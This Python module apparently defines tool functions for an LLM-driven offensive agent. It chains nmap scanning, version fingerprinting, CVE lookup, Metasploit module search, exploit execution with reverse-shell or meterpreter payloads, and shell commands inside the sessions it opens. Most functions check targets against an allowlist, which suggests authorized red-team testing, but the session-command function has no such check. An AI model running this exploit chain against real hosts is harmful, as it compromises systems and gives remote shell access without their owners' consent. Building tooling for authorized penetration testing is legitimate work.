import json
import os
import sys

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from Code_For_RTA.offensive_agent import (
    authorization,
    cve_lookup,
    metasploit_client,
    nmap_wrapper,
    session_manager,
)


def red_nmap_scan(target: str, ports: str = "1-10000") -> str:
    """
    Scan a target host or network for open ports and fingerprint the services behind them.

    Use this first to discover what is reachable on a target. Only RFC1918 and allowlisted
    targets are permitted; anything else is refused.

    Args:
        target: An IP, hostname, CIDR (e.g. 192.168.1.0/24), or dash-range.
        ports: Port range string (default "1-10000"). Use "1-65535" for a full scan.

    Returns:
        JSON string containing a list of {host, port, proto, state, service, product, version, extrainfo, cpe}.
    """
    err = authorization.require_allowed(target)
    if err:
        return err
    try:
        services = nmap_wrapper.run_service_scan(target, ports=ports)
    except Exception as e:
        return f"Error running nmap: {e}"
    return json.dumps(services, indent=2)


def red_fingerprint_service(host: str, port: int) -> str:
    """
    Perform a deep version probe on a single open port to extract the exact product and version.

    Use after red_nmap_scan when the first scan did not return a version. Output is normalized
    to the vendor:product:version format required by red_cve_lookup.

    Args:
        host: The target IP or hostname.
        port: The TCP port to probe.

    Returns:
        JSON string with {host, port, service, product, version, cpe, vendor_product_version}.
        The vendor_product_version field is null if no CPE could be extracted.
    """
    err = authorization.require_allowed(host)
    if err:
        return err
    try:
        svc = nmap_wrapper.fingerprint_port(host, port)
    except Exception as e:
        return f"Error fingerprinting {host}:{port}: {e}"
    if not svc:
        return json.dumps({"error": f"No service detected on {host}:{port}"})
    svc["vendor_product_version"] = nmap_wrapper.cpe_to_vendor_product_version(svc.get("cpe", ""))
    return json.dumps(svc, indent=2)


def red_cve_lookup(vendor_product_version: str) -> str:
    """
    Query the NVD CVE database for known vulnerabilities affecting a specific product version.

    Args:
        vendor_product_version: Identifier in the form "vendor:product:version",
            e.g. "apache:http_server:2.4.49". This is the same format that red_fingerprint_service
            returns in its vendor_product_version field.

    Returns:
        JSON string with a list of {cve_id, description, cvss} entries. Empty list if none found.
    """
    try:
        cves = cve_lookup.lookup_cves(vendor_product_version)
    except Exception as e:
        return f"Error querying NVD: {e}"
    return json.dumps(cves, indent=2)


def red_search_metasploit_modules(query: str) -> str:
    """
    Search the Metasploit Framework module database for exploits matching a CVE ID or keyword.

    Args:
        query: A CVE ID (e.g. "CVE-2021-41773") or a product keyword (e.g. "apache path traversal").

    Returns:
        JSON string with a list of {path, type, rank, disclosure_date, name}. The path is what
        you pass to red_run_exploit as the module argument.
    """
    try:
        modules = metasploit_client.search_modules(query)
    except Exception as e:
        return f"Error searching Metasploit: {e}"
    return json.dumps(modules, indent=2)


def red_run_exploit(
    module: str,
    rhost: str,
    rport: int,
    payload: str,
    lhost: str,
    lport: int,
    extra_options_json: str = "{}",
) -> str:
    """
    Load a Metasploit exploit module, configure it, fire it at the target, and wait for a session.

    Args:
        module: Full module path, e.g. "exploit/multi/http/apache_normalize_path_rce".
        rhost: Target host (must be in the allowlist).
        rport: Target port.
        payload: Payload module path, e.g. "linux/x64/meterpreter/reverse_tcp".
        lhost: Local listen host for the reverse connection.
        lport: Local listen port for the reverse connection.
        extra_options_json: JSON string of extra module options, e.g. '{"TARGETURI": "/cgi-bin/"}'.

    Returns:
        JSON string with {started, job_id, session} where session is the matched session dict
        (or null if no session opened within 30 seconds).
    """
    err = authorization.require_allowed(rhost)
    if err:
        return err
    try:
        extra = json.loads(extra_options_json) if extra_options_json else {}
    except json.JSONDecodeError:
        extra = {}

    try:
        result = metasploit_client.run_exploit(module, rhost, rport, payload, lhost, lport, extra)
    except Exception as e:
        return f"Error running exploit: {e}"

    session = session_manager.wait_for_session(rhost, timeout=30.0)
    return json.dumps({
        "started": result.get("started", False),
        "job_id": result.get("job_id"),
        "exploit_output": result.get("output", ""),
        "session": session,
    }, indent=2)


def red_list_sessions() -> str:
    """
    List all active Metasploit sessions (opened reverse shells or meterpreter sessions).

    Returns:
        JSON string with a list of {id, type, target_host, tunnel_peer, info, via_exploit}.
    """
    try:
        sessions = metasploit_client.list_sessions()
    except Exception as e:
        return f"Error listing sessions: {e}"
    return json.dumps(sessions, indent=2)


def red_execute_in_session(session_id: int, command: str) -> str:
    """
    Execute a shell or meterpreter command inside an existing session and return its output.

    Args:
        session_id: The session ID from red_list_sessions.
        command: The command to run, e.g. "id", "whoami", "uname -a".

    Returns:
        The command's stdout as a string, or an error message.
    """
    try:
        return metasploit_client.run_in_session(session_id, command)
    except Exception as e:
        return f"Error executing in session {session_id}: {e}"


def red_full_attack_chain(target: str, lhost: str, lport: int) -> str:
    """
    Run the full scan -> fingerprint -> CVE lookup -> Metasploit module search chain on a target
    and return a consolidated report. Does NOT auto-execute exploits; the LLM must still choose
    a module and call red_run_exploit explicitly.

    Args:
        target: The IP or hostname to attack (must be in the allowlist).
        lhost: Local listen host (for context; not used until red_run_exploit).
        lport: Local listen port (for context; not used until red_run_exploit).

    Returns:
        JSON string: {target, services: [...], findings: [{service, cves, msf_modules}]}.
    """
    err = authorization.require_allowed(target)
    if err:
        return err

    try:
        services = nmap_wrapper.run_service_scan(target)
    except Exception as e:
        return f"Error running nmap: {e}"

    findings = []
    for svc in services:
        vpv = nmap_wrapper.cpe_to_vendor_product_version(svc.get("cpe", ""))
        if not vpv and svc.get("product") and svc.get("version"):
            vpv = f"{svc['product'].lower().replace(' ', '_')}:{svc['product'].lower().replace(' ', '_')}:{svc['version']}"
        if not vpv:
            continue

        try:
            cves = cve_lookup.lookup_cves(vpv, max_results=5)
        except Exception:
            cves = []

        msf_hits: list[dict] = []
        for c in cves[:3]:
            try:
                msf_hits.extend(metasploit_client.search_modules(c["cve_id"], limit=3))
            except Exception:
                pass

        findings.append({
            "service": f"{svc['host']}:{svc['port']} {svc.get('product','')} {svc.get('version','')}".strip(),
            "vendor_product_version": vpv,
            "cves": cves,
            "msf_modules": msf_hits,
        })

    return json.dumps({
        "target": target,
        "lhost": lhost,
        "lport": lport,
        "services": services,
        "findings": findings,
    }, indent=2)
